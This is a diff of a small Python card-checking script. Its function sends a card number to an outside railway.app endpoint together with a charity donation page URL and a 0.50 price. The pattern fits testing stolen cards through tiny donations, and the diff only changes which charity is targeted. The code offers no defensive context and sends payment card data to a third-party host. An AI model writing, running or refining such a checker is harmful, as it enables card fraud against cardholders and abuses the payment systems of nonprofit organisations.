@@ -1,7 +1,7 @@
 import requests
 def chkk(ccx):
 	cc=ccx.strip()
-	urll="https://manifestedglorywc.org/giving/"
+	urll="https://princessforaday.org/donations/sponsor-a-bag/"
 	price="0.50"
 	res=requests.get(f'https://pqy2-production.up.railway.app/paypal?cc={cc}&url={urll}&price={price}').text
 	return res
